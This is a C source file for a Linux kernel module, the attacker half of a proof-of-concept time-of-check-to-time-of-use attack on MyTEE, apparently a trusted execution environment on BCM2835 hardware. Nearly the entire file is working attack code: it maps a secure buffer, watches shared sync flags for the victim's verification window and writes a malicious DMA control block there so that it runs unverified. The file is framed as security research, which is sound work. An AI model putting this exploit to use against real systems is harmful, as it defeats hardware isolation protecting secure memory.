/*
 * MyTEE TOCTOU Attack - Attacker Module (runs on Core 1)
 * 
 * This module runs on Core 1 and waits for the victim (Core 0) to
 * overflow its CB buffer into Core 1's region. Then it injects
 * malicious control blocks that will be executed by the DMA controller
 * WITHOUT verification (TOCTOU attack).
 *
 * Attack Flow:
 * 1. Wait for sync signal indicating victim has started DMA request
 * 2. Prepare malicious CB in Core 1's secure buffer region
 * 3. Trigger HVC to copy our malicious CB to secure buffer
 * 4. DMA controller executes CB[128+] = our unverified malicious CB
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/io.h>
#include <linux/delay.h>
#include <linux/kthread.h>
#include <linux/smp.h>
#include <linux/dma-mapping.h>
#include <linux/slab.h>
#include <linux/scatterlist.h>

#include "toctou_common.h"

#define DRIVER_NAME "toctou_attacker"

/* Module parameters */
static int debug = 0;  /* Disabled by default for timing */
module_param(debug, int, 0644);
MODULE_PARM_DESC(debug, "Enable debug output (WARNING: affects timing)");

/* Runtime state */
static void __iomem *sync_flag_base;
static void __iomem *secure_buffer_base;
static struct task_struct *attack_thread;
static volatile int stop_attack = 0;

/* DMA resources for triggering HVC trap */
static struct device *dma_dev;
static dma_addr_t malicious_cb_dma;
static struct bcm2835_dma_cb *malicious_cb;

static inline void sync_write(u32 offset, u32 value)
{
    if (sync_flag_base) {
        writel(value, sync_flag_base + offset);
        wmb();
    }
}

static inline u32 sync_read(u32 offset)
{
    if (sync_flag_base) {
        rmb();
        return readl(sync_flag_base + offset);
    }
    return 0;
}

/* Debug macro - only prints when debug=1, use sparingly */
#define DBG(fmt, ...) do { if (debug) pr_info(fmt, ##__VA_ARGS__); } while(0)

/*
 * Prepare malicious control block
 * This CB will be copied to Core 1's secure buffer and then
 * executed by DMA when it follows the chain from Core 0's overflow
 */
static int prepare_malicious_cb(void)
{
    /* Allocate DMA-able memory for our malicious CB */
    malicious_cb = dma_alloc_coherent(dma_dev, sizeof(struct bcm2835_dma_cb),
                                       &malicious_cb_dma, GFP_KERNEL);
    if (!malicious_cb) {
        pr_err("[ATTACKER] Failed to allocate malicious CB\n");
        return -ENOMEM;
    }

    /* Fill with attack pattern */
    malicious_cb->info = ATTACK_MAGIC_INFO;
    malicious_cb->src = ATTACK_MAGIC_SRC;      /* Malicious source address */
    malicious_cb->dst = ATTACK_MAGIC_DST;      /* Malicious destination address */
    malicious_cb->length = ATTACK_MAGIC_LENGTH;
    malicious_cb->stride = 0;
    malicious_cb->next = 0;  /* End of chain */

    /* Only log after attack, not during */

    return 0;
}

/*
 * Trigger DMA request to cause HVC trap
 * This will copy our malicious CB to Core 1's secure buffer
 */
static void trigger_malicious_dma(void)
{
    /* 
     * We need to trigger an HVC trap that will copy our CB to secure buffer.
     * In a real attack, this would be done through a legitimate DMA path.
     * For PoC, we directly write to the secure buffer region since we're
     * demonstrating the lack of isolation.
     */
    void __iomem *core1_buffer;
    int my_core = smp_processor_id();

    if (!secure_buffer_base) {
        pr_err("[ATTACKER] Secure buffer not mapped\n");
        return;
    }

    /* Calculate Core 1's buffer address */
    core1_buffer = secure_buffer_base + (1 * SECURE_BUFFER_SIZE_PER_CORE);

    /* NO LOGGING HERE - timing critical! */
    
    /* Write the malicious CB at the start of Core 1's buffer */
    writel(ATTACK_MAGIC_INFO, core1_buffer + 0x00);   /* info */
    writel(ATTACK_MAGIC_SRC, core1_buffer + 0x04);    /* src */
    writel(ATTACK_MAGIC_DST, core1_buffer + 0x08);    /* dst */
    writel(ATTACK_MAGIC_LENGTH, core1_buffer + 0x0C); /* length */
    writel(0, core1_buffer + 0x10);                   /* stride */
    writel(0, core1_buffer + 0x14);                   /* next = NULL (end) */

    wmb();
}

/*
 * Attack thread - waits for sync signal and injects malicious CB
 */
static int attack_thread_fn(void *data)
{
    u32 state;
    int my_core = smp_processor_id();

    pr_info("[ATTACKER] Attack thread started on Core %d\n", my_core);

    /* Verify we're on Core 1 */
    if (my_core != 1) {
        pr_warn("[ATTACKER] Warning: Running on Core %d, should be Core 1\n", my_core);
    }

    while (!kthread_should_stop() && !stop_attack) {
        state = sync_read(SYNC_OFFSET_STATE);

        switch (state) {
        case SYNC_STATE_VICTIM_TRAPPED:
            /* Critical timing window - inject NOW, no logging! */
            trigger_malicious_dma();
            sync_write(SYNC_OFFSET_STATE, SYNC_STATE_ATTACKER_INJECT);
            break;

        case SYNC_STATE_ATTACK_DONE:
            /* Safe to log after attack completes */
            if (sync_read(SYNC_OFFSET_ATTACK_RESULT) == 1) {
                pr_info("[ATTACKER] ATTACK SUCCESS - unverified CB executed\n");
            }
            sync_write(SYNC_OFFSET_STATE, SYNC_STATE_IDLE);
            break;

        default:
            break;
        }

        /* Tight polling */
        cpu_relax();
    }

    pr_info("[ATTACKER] Attack thread stopping\n");
    return 0;
}

static int __init toctou_attacker_init(void)
{
    int ret;
    int target_core = 1;

    pr_info("[ATTACKER] Loading TOCTOU attacker module\n");

    /* Ensure we're on the correct core */
    if (smp_processor_id() != target_core) {
        pr_warn("[ATTACKER] Module loaded on Core %d, attack thread will run on Core 1\n",
                smp_processor_id());
    }

    /* Map sync flag memory */
    sync_flag_base = ioremap(SYNC_FLAG_PHYS, SYNC_FLAG_SIZE);
    if (!sync_flag_base) {
        pr_err("[ATTACKER] Failed to map sync flag memory\n");
        return -ENOMEM;
    }
    pr_info("[ATTACKER] Sync flags mapped at %p\n", sync_flag_base);

    /* Map secure buffer region (to demonstrate lack of isolation) */
    secure_buffer_base = ioremap(SECURE_BUFFER_BASE_PHYS,
                                  SECURE_BUFFER_SIZE_PER_CORE * NUM_CORES);
    if (!secure_buffer_base) {
        pr_err("[ATTACKER] Failed to map secure buffer\n");
        ret = -ENOMEM;
        goto err_unmap_sync;
    }
    pr_info("[ATTACKER] Secure buffer mapped at %p (phys 0x%08x)\n",
            secure_buffer_base, SECURE_BUFFER_BASE_PHYS);

    /* Initialize sync state */
    sync_write(SYNC_OFFSET_STATE, SYNC_STATE_IDLE);
    sync_write(SYNC_OFFSET_ATTACK_RESULT, 0);

    /* Create attack thread pinned to Core 1 */
    attack_thread = kthread_create(attack_thread_fn, NULL, "toctou_attacker");
    if (IS_ERR(attack_thread)) {
        pr_err("[ATTACKER] Failed to create attack thread\n");
        ret = PTR_ERR(attack_thread);
        goto err_unmap_secure;
    }

    /* Pin to Core 1 */
    kthread_bind(attack_thread, target_core);
    wake_up_process(attack_thread);

    pr_info("[ATTACKER] Module loaded, attack thread running on Core %d\n", target_core);
    pr_info("[ATTACKER] Waiting for victim to trigger DMA overflow...\n");

    return 0;

err_unmap_secure:
    iounmap(secure_buffer_base);
err_unmap_sync:
    iounmap(sync_flag_base);
    return ret;
}

static void __exit toctou_attacker_exit(void)
{
    pr_info("[ATTACKER] Unloading module\n");

    stop_attack = 1;

    if (attack_thread) {
        kthread_stop(attack_thread);
    }

    if (malicious_cb && dma_dev) {
        dma_free_coherent(dma_dev, sizeof(struct bcm2835_dma_cb),
                          malicious_cb, malicious_cb_dma);
    }

    if (secure_buffer_base) {
        iounmap(secure_buffer_base);
    }

    if (sync_flag_base) {
        iounmap(sync_flag_base);
    }

    pr_info("[ATTACKER] Module unloaded\n");
}

module_init(toctou_attacker_init);
module_exit(toctou_attacker_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Security Research");
MODULE_DESCRIPTION("MyTEE TOCTOU Attack - Attacker Module");
